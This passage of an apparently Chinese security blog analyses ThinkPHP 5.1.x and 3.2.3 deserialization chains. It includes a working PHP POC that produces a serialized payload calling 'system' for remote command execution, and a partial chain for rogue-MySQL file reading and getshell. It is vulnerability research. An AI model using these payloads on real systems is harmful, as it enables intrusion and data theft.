<code>\\thinkphp\\library\\think\\Request.php::filterValue()</code></p>\n<h3 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h3><ol>\n<li><p>寻找漏洞入口：全局搜索<code>__destruct</code>方法</p>\n<p>在<code>\\thinkphp\\library\\think\\process\\pipes\\Windows.php</code>中找到</p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210818193808753.png\" alt=\"image-20210818193808753\"></p>\n<p>这里分别跟进两个函数，<code>close()</code>函数不存在利用点，这里选择跟进<code>removeFiles()</code>函数</p>\n</li>\n<li><p>跟进到<code>removeFiles()</code>，该函数调用了<code>file_exists</code>函数，这里的<code>this-&gt;files</code>可控，是一个任意文件删除漏洞。</p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210818194215004.png\" alt=\"image-20210818194215004\"></p>\n</li>\n<li><p>这里考虑到<code>$filename</code>可控，所以可以寻找<code>__toString</code>方法</p>\n<p>在<code>\\thinkphp\\library\\think\\model\\concern\\Conversion.php</code>中找到</p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210818195236640.png\" alt=\"image-20210818195236640\"></p>\n</li>\n<li><p>继续跟进<code>__toJson</code></p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210818195331153.png\" alt=\"image-20210818195331153\"></p>\n</li>\n<li><p>再跟进到<code>__toArray()</code>，我们需要在<code>__toArry()</code>方法中寻找一个<code>可控变量-&gt;函数（参数可控）</code>的点。</p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210819165328946.png\" alt=\"image-20210819165328946\"></p>\n<p>在<code>__toArray()</code>中锁定到<code>$relation-&gt;visible($name)</code>，其中的<code>$relation = this -&gt; getAttr($key)</code>，因为循环<code>foreach</code>中<code>$this-&gt;append</code>可控，所以传入<code>getAttr()</code>中的参数<code>$key</code>，<code>name</code>可控，而我们跟进到<code>getAttr()</code>函数中</p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210819165730750.png\" alt=\"image-20210819165730750\"></p>\n<p>在继续跟进到<code>getData()</code>中</p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210819172436139.png\" alt=\"image-20210819172436139\"></p>\n<p>因为<code>__toArray</code>中的<code>$key</code>可控，所以<code>getData()</code>中的<code>$name</code>可控。该函数的<code>$this-&gt;data</code>也是可控的，那么将<code>return $this -&gt;data[&#39;$name&#39;]</code>，即<code>relation</code>的值为<code>this-&gt;data[$name]</code>。现在变成了<code>可控变量-&gt;visible(可控)</code></p>\n<p>我们全局搜索<code>visible</code>，一共有三处，但是都不能很好的利用。所以寻找<code>__call</code>方法</p>\n</li>\n<li><p>跟进到<code>\\thinkphp\\library\\think\\Request.php</code>中找到<code>__call</code>方法</p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210819210223824.png\" alt=\"image-20210819210223824\"></p>\n<p>在<code>__call</code>方法中，可以通过控制变量进入到<code>if</code>循环，调用<code>call_user_func_array</code>。该函数的第一个参数是完全可控的，但是<code>$args</code>会受到一定的限制（<code>array_unshift</code>：把本类对象<code>$this</code>放在数组变量<code>$args</code>的第一个）。在一些老版本的ThinkPHP RCE中通常会利用到<code>input</code>方法。这个地方因为<code>$args</code>不是完全受控，所以我们可以通过另外的方法来间接调用<code>input</code>方法</p>\n</li>\n</ol>\n<ol start=\"7\">\n<li><p>调用<code>input</code>方法的地方很多，我们找到的是<code>param()</code>方法</p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210819212852538.png\" alt=\"image-20210819212852538\"></p>\n<p>但是这里的<code>$name</code>由<code>$args</code>决定，但是<code>$arges</code>不可控，所以传入<code>Input</code>的参数不可控。这里我们转换思路，调用<code>input</code>中可以多加几个跳板，所以这里继续搜寻能调用<code>param()</code>函数的方法，并且传入其中的第一个参数可控。</p>\n</li>\n<li><p>跟进到了<code>isAjax()</code></p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210819213413216.png\" alt=\"image-20210819213413216\"></p>\n<p>在这里面<code>$this-&gt;config[&#39;var_ajax&#39;]</code>可控，就代表<code>param()</code>中的<code>$name</code>可控，那么传入<code>input()</code>中的<code>$name</code>也是可控的</p>\n</li>\n<li><p>回到<code>input</code>处</p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210819214339836.png\" alt=\"image-20210819214339836\"></p>\n<p><code>$this-&gt;param</code>可控，这样前面的就全部穿起来了。通过<code>__call()</code>调用<code>isAjax()</code>，再调用<code>param()</code>，最后到<code>input()</code></p>\n</li>\n<li><p>跟进到<code>input()</code></p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210820112428559.png\" alt=\"image-20210820112428559\"></p>\n</li>\n</ol>\n<pre><code>在`input`方法中我们最后想利用的`filterValue`函数，该函数中存在`call_user_func`，可以通过它来达到命令执行的目的。所以我们要注意传入`filterValue`的参数`$data`和`$filter`\n\n进入到`getData`\n\n![image-20210820112522253](https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210820112522253.png)\n\n对`$data`的值进行处理，这里相当于`$data = $data[$val]`，而传入`input`的`$name`可控，最后`data`的值也可控\n\n再跟进到`getFilter`\n\n![image-20210820112819715](https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210820112819715.png)\n\n`$filter`的值可控，为`$this-&gt;filter`，即从`input`的参数`$filter`。\n\n回到`input()`函数中\n\n![image-20210820113940096](https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210820113940096.png)\n\n这个地方是一个回调函数\n\n![image-20210820114032634](https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210820114032634.png)\n\n`$data`为一个数组且**可控**，传入到`filterValue`函数，参数为`$filter`，且参数也**可控**</code></pre><ol start=\"11\">\n<li><p>进入<code>filterValue</code>函数</p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210820114359668.png\" alt=\"image-20210820114359668\"></p>\n<p><code>filterValue</code>函数中<code>$value</code>为请求的键，<code>$key</code>为请求的值，这两个参数正好对应传入<code>input</code>中的变量<code>$data</code>为数组，而<code>$filters</code>也是可控的。最后传入<code>call_user_func</code>，完成命令执行。</p>\n</li>\n</ol>\n<h3 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h3><p>首先在<code>Model</code>类中，对<code>$append</code>和<code>$data</code>进行赋值，<code>$key</code>要满足不在<code>$relation</code>当中，所以随便定一个值。而要满足<code>$relation</code>为<code>$this-&gt;data[$name]</code>，这里<code>$data</code>的值要和<code>$key</code>相同</p>\n<blockquote>\n<p><code>$append</code>为数组，且决定<code>$name</code>和<code>$key</code>值</p>\n</blockquote>\n<p><code>$name</code>的赋值要调用到<code>__call</code>函数，且为<code>__call()</code>函数的<code>$args</code>，想要调用<code>call_user_func_array</code>，这里的<code>$this-&gt;hook</code>键设置为<code>visable</code>和<code>$method</code>相同进入循环。</p>\n<p>再赋值hook函数的值为<code>isAjax</code>，再通过设置<code>config[&#39;var_ajax&#39;]</code>进入到<code>param()</code>函数，再到<code>input</code>，最后进入<code>filterValue</code>，调用<code>call_user_func</code>达到命令执行</p>\n<h4 id=\"POC\"><a href=\"#POC\" class=\"headerlink\" title=\"POC\"></a>POC</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">think</span>;</span><br><span class=\"line\"><span class=\"keyword\">abstract</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Model</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> $append = [];</span><br><span class=\"line\">    <span class=\"keyword\">private</span> $data = [];</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;append = [<span class=\"string\">\"xmhgg\"</span>=&gt;[<span class=\"string\">\"ls\"</span>,<span class=\"string\">\"\"</span>]];</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;data = [<span class=\"string\">\"xmhgg\"</span>=&gt;<span class=\"keyword\">new</span> Request()];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Request</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> $hook = [];</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> $filter;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> $config = [</span><br><span class=\"line\">        <span class=\"comment\">// 表单请求类型伪装变量</span></span><br><span class=\"line\">        <span class=\"string\">'var_method'</span>       =&gt; <span class=\"string\">'_method'</span>,</span><br><span class=\"line\">        <span class=\"comment\">// 表单ajax伪装变量</span></span><br><span class=\"line\">        <span class=\"string\">'var_ajax'</span>         =&gt; <span class=\"string\">'_ajax'</span>,</span><br><span class=\"line\">        <span class=\"comment\">// 表单pjax伪装变量</span></span><br><span class=\"line\">        <span class=\"string\">'var_pjax'</span>         =&gt; <span class=\"string\">'_pjax'</span>,</span><br><span class=\"line\">        <span class=\"comment\">// PATHINFO变量名 用于兼容模式</span></span><br><span class=\"line\">        <span class=\"string\">'var_pathinfo'</span>     =&gt; <span class=\"string\">'s'</span>,</span><br><span class=\"line\">        <span class=\"comment\">// 兼容PATH_INFO获取</span></span><br><span class=\"line\">        <span class=\"string\">'pathinfo_fetch'</span>   =&gt; [<span class=\"string\">'ORIG_PATH_INFO'</span>, <span class=\"string\">'REDIRECT_PATH_INFO'</span>, <span class=\"string\">'REDIRECT_URL'</span>],</span><br><span class=\"line\">        <span class=\"comment\">// 默认全局过滤方法 用逗号分隔多个</span></span><br><span class=\"line\">        <span class=\"string\">'default_filter'</span>   =&gt; <span class=\"string\">''</span>,</span><br><span class=\"line\">        <span class=\"comment\">// 域名根，如thinkphp.cn</span></span><br><span class=\"line\">        <span class=\"string\">'url_domain_root'</span>  =&gt; <span class=\"string\">''</span>,</span><br><span class=\"line\">        <span class=\"comment\">// HTTPS代理标识</span></span><br><span class=\"line\">        <span class=\"string\">'https_agent_name'</span> =&gt; <span class=\"string\">''</span>,</span><br><span class=\"line\">        <span class=\"comment\">// IP代理获取标识</span></span><br><span class=\"line\">        <span class=\"string\">'http_agent_ip'</span>    =&gt; <span class=\"string\">'HTTP_X_REAL_IP'</span>,</span><br><span class=\"line\">        <span class=\"comment\">// URL伪静态后缀</span></span><br><span class=\"line\">        <span class=\"string\">'url_html_suffix'</span>  =&gt; <span class=\"string\">'html'</span>,</span><br><span class=\"line\">    ];</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;filter = <span class=\"string\">\"system\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;config = [<span class=\"string\">\"var_ajax\"</span>=&gt;<span class=\"string\">''</span>];</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;hook = [<span class=\"string\">\"visible\"</span>=&gt;[<span class=\"keyword\">$this</span>,<span class=\"string\">\"isAjax\"</span>]];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">think</span>\\<span class=\"title\">process</span>\\<span class=\"title\">pipes</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">think</span>\\<span class=\"title\">model</span>\\<span class=\"title\">concern</span>\\<span class=\"title\">Conversion</span>;</span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">think</span>\\<span class=\"title\">model</span>\\<span class=\"title\">Pivot</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Windows</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> $files = [];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;files=[<span class=\"keyword\">new</span> Pivot()];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">think</span>\\<span class=\"title\">model</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">think</span>\\<span class=\"title\">Model</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Pivot</span> <span class=\"keyword\">extends</span> <span class=\"title\">Model</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">think</span>\\<span class=\"title\">process</span>\\<span class=\"title\">pipes</span>\\<span class=\"title\">Windows</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> base64_encode(serialize(<span class=\"keyword\">new</span> Windows()));</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210820162236872.png\" alt=\"image-20210820162236872\"></p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>5.1.X的反序列化，也是和老版本的<code>input</code>利用类似，只不过找了其他的跳板进入漏洞点。审计的核心思想就是：找到危险函数，然后危险函数的参数是否可控，如果不可控能否绕过，如果可控怎样绕过前置条件传递参数。</p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20191002211046-0c03a88e-e516-1.png\" alt=\"20191002211046-0c03a88e-e516-1\"></p>\n<h2 id=\"参考：\"><a href=\"#参考：\" class=\"headerlink\" title=\"参考：\"></a>参考：</h2><p><a href=\"https://xz.aliyun.com/t/6467#toc-1\" target=\"_blank\" rel=\"noopener\">https://xz.aliyun.com/t/6467#toc-1</a></p>\n","categories":["漏洞复现"],"tags":["代码审计","Thinkphp"]},{"title":"TP3.2.3反序列化分析","url":"http://yoursite.com/2021/08/03/ThinkPHP3.2.3/","content":"<h2 id=\"测试环境搭建\"><a href=\"#测试环境搭建\" class=\"headerlink\" title=\"测试环境搭建\"></a>测试环境搭建</h2><p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210811145206876.png\" alt=\"image-20210811145206876\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210811145151660.png\" alt=\"image-20210811145151660\"></p>\n<h2 id=\"原理分析\"><a href=\"#原理分析\" class=\"headerlink\" title=\"原理分析\"></a>原理分析</h2><p>POP链：</p>\n<p><code>\\ThinkPHP\\Library\\Think\\Image\\Driver\\Imagick.class.php::__destruct()</code> -&gt; <code>\\ThinkPHP\\Library\\Think\\Session\\Driver\\Memcache.class.php::destroy()</code> -&gt; <code>\\ThinkPHP\\Library\\Think\\Model.class.php::delete()</code> -&gt;<code>\\ThinkPHP\\Library\\Think\\Model.class.php::execute()</code>-&gt;<code>\\ThinkPHP\\Library\\Think\\Model.class.php::initConnect()</code>-&gt;<code>\\ThinkPHP\\Library\\Think\\Model.class.php::connect()</code></p>\n<ol>\n<li><p>寻找入口：全局搜索<code>__destruct</code>方法</p>\n<p>在<code>\\ThinkPHP\\Library\\Think\\Image\\Driver\\Imagick.class.php</code>文件下找到</p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210711152918918.png\" alt=\"image-20210711152918918\"></p>\n<blockquote>\n<p>选择这个<code>__destruct</code>方法，是因为这里的<code>$this-&gt;img</code>方法可控，同时可以调用其他类的<code>destroy</code>方法，另外也可以调用不存在<code>destory</code>方法的类<code>__call</code>，但是这里没有可以利用的<code>__call</code>方法</p>\n</blockquote>\n</li>\n<li><p>跟进到<code>destroy</code>方法</p>\n<p>选择的是<code>\\ThinkPHP\\Library\\Think\\Session\\Driver\\Memcache.class.php</code></p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210711204309818.png\" alt=\"image-20210711204309818\"></p>\n<p>这里面的<code>destroy</code>方法需要参数，但是我们在<code>__destruct</code>方法中调用<code>destroy()</code>的时候是没有传参的，而在<strong>PHP5</strong>中，只会发出Warning，但是在<strong>PHP7</strong>中会报错，所以该漏洞只能在PHP5中进行利用</p>\n</li>\n<li><p>跟进到<code>delete</code>方法</p>\n<p><code>delete</code>方法位于<code>\\ThinkPHP\\Library\\Think\\Model.class.php</code></p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210803201347279.png\" alt=\"image-20210803201347279\"></p>\n<p>在第一部分中：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$pk   =  <span class=\"keyword\">$this</span>-&gt;getPk();</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">empty</span>($options) &amp;&amp; <span class=\"keyword\">empty</span>(<span class=\"keyword\">$this</span>-&gt;options[<span class=\"string\">'where'</span>])) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 如果删除条件为空 则删除当前数据对象所对应的记录</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"keyword\">empty</span>(<span class=\"keyword\">$this</span>-&gt;data) &amp;&amp; <span class=\"keyword\">isset</span>(<span class=\"keyword\">$this</span>-&gt;data[$pk]))</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;delete(<span class=\"keyword\">$this</span>-&gt;data[$pk]);</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n</li>\n</ol>\n<p>   <code>$pk =$this -&gt; getPk()</code>，调用了<code>getPk()</code>方法，而这里的<code>getPk()</code>如下，实际上这里的<code>$pk = $this=&gt;pk;</code>，即：<code>$pk</code>可控。</p>\n<p>   <img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210803201626533.png\" alt=\"image-20210803201626533\"></p>\n<p>   继续往下看，代码会进入<code>if</code>分支（<strong>因为其中的<code>$options</code>为<code>$delete</code>方法中的参数，由前两个方法可以得到，调用<code>$delete</code>方法时，传入的参数为空</strong>），在嵌套<code>if</code>循环的判断条件中<code>this-&gt;data</code>可控，所以可以进入嵌套<code>if</code>循环，此时返回<code>$this-&gt;delete($this-&gt;data[$pk]);</code>，这意味着我们可以<strong>带参数调用delete方法</strong>，并且参数可控。</p>\n<p>   在第二部分中：</p>\n<p>   当带参数调用<code>delete()</code>方法，会对参数进行一系列的处理，最后到达</p>\n<p>   <img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210803205540351.png\" alt=\"image-20210803205540351\"></p>\n<p>   通过<code>$this-&gt;db-&gt;delete($option)</code>，我们可以调用任意自带的数据库类中的<code>delete()</code>方法</p>\n<ol start=\"4\">\n<li><p>跟进到数据库类中的<code>delete()</code>方法</p>\n<p>数据库类中的<code>delete()</code>方法位于<code>\\ThinkPHP\\Library\\Think\\Db\\Driver.class.php::delete()</code></p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210803212259871.png\" alt=\"image-20210803212259871\"></p>\n<p>在此方法的最后会将<code>$sql</code>传入<code>$this-&gt;execute</code>。往上寻找到<code>$sql</code>：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$sql = <span class=\"string\">'DELETE FROM '</span>.$table;</span><br></pre></td></tr></table></figure>\n\n<p>其中的<code>$table</code>可控，为<code>$this-&gt;parseTable($options[&#39;table&#39;]);</code>。所以我们传入的<code>$sql</code>可控。</p>\n</li>\n<li><p>跟进到<code>execute</code>方法</p>\n<p>方法位于<code>\\ThinkPHP\\Library\\Think\\Model.class.php</code></p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210803214332091.png\" alt=\"image-20210803214332091\"></p>\n<p>函数的第一行调用<code>initConnect</code>方法，对数据库连接进行初始化操作。</p>\n</li>\n<li><p>跟进到<code>initConnect</code>方法</p>\n<p>方法位于<code>\\ThinkPHP\\Library\\Think\\Model.class.php</code></p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210803214555218.png\" alt=\"image-20210803214555218\"></p>\n<p>通常情况下采用但数据库模式，所以我们通过对成员变量的控制，可以调用<code>$this-&gt;connect()</code></p>\n</li>\n<li><p>跟进到<code>connect</code>方法</p>\n<p>方法位于<code>\\ThinkPHP\\Library\\Think\\Model.class.php</code></p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210803214806677.png\" alt=\"image-20210803214806677\"></p>\n<p>该方法通过<code>$this-&gt;config</code>去配置数据库连接，连接数据库的方式为PDO连接。</p>\n</li>\n</ol>\n<h2 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h2><p> 想要通过注入GetShell，需要获取到目标数据库的配置文件。而这条POP链正好可以做到任意数据库连接，所以我们可以通过MySQL任意文件读取，先获取客户端数据库的配置文件，再通过注入GetShell。</p>\n<p>先配置恶意MySQL服务端，项目地址：</p>\n<p><a href=\"https://github.com/allyshka/Rogue-MySql-Server\" target=\"_blank\" rel=\"noopener\">https://github.com/allyshka/Rogue-MySql-Server</a></p>\n<blockquote>\n<p>windows注意文件路径，脚本环境为python2</p>\n</blockquote>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210811145243668.png\" alt=\"image-20210811145243668\"></p>\n<p>再通过POC进行反序列化：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">Think</span>\\<span class=\"title\">Image</span>\\<span class=\"title\">Driver</span>&#123;</span><br><span class=\"line\">    <span class=\"title\">use</span> <span class=\"title\">Think</span>\\<span class=\"title\">Session</span>\\<span class=\"title\">Driver</span>\\<span class=\"title\">Memcache</span>;</span><br><span class=\"line\">    <span class=\"keyword\">use</span> <span class=\"title\">Think</span>\\<span class=\"title\">Image</span>;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Imagick</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> $img;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">        </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;img = <span class=\"keyword\">new</span> Memcache();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">Think</span>\\<span class=\"title\">Session</span>\\<span class=\"title\">Driver</span>&#123;</span><br><span class=\"line\">    <span class=\"title\">use</span> <span class=\"title\">Think</span>\\<span class=\"title\">Model</span>;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Memcache</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> $handle;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">        </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;handle = <span class=\"keyword\">new</span> Model();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">Think</span>&#123;</span><br><span class=\"line\">    <span class=\"title\">use</span> <span class=\"title\">Think</span>\\<span class=\"title\">Db</span>\\<span class=\"title\">Driver</span>\\<span class=\"title\">Mysql</span>;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Model</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> $pk = <span 